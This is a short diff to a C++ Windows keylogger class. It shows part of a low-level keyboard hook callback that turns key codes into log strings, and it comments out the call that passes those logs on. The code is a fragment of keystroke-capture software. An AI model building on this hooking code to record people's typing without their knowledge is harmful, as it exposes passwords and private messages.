@@ -46,11 +46,11 @@ LRESULT KeyLogger::HookCallback(const int nCode, const WPARAM wParam, LPARAM lPa
 	{
 		const auto keyboardEvent = *reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
 
-		std::string log = GetLog(keyboardEvent.vkCode);
+		const std::string log = GetLog(keyboardEvent.vkCode);
 
 		for (const auto& instance : _instances)
 		{
-			instance->LogKeyboardEvent(log);
+			//instance->LogKeyboardEvent(log);
 		}
 	}
 
@@ -111,7 +111,7 @@ std::string KeyLogger::GetWindowPrefix(const HWND windowHandle)
 	return "";
 }
 
-void KeyLogger::LogKeyboardEvent(const std::string& log)
+void KeyLogger::LogKeyboardEvent(const std::string& log) const
 {
 	Trace(log.c_str());
 
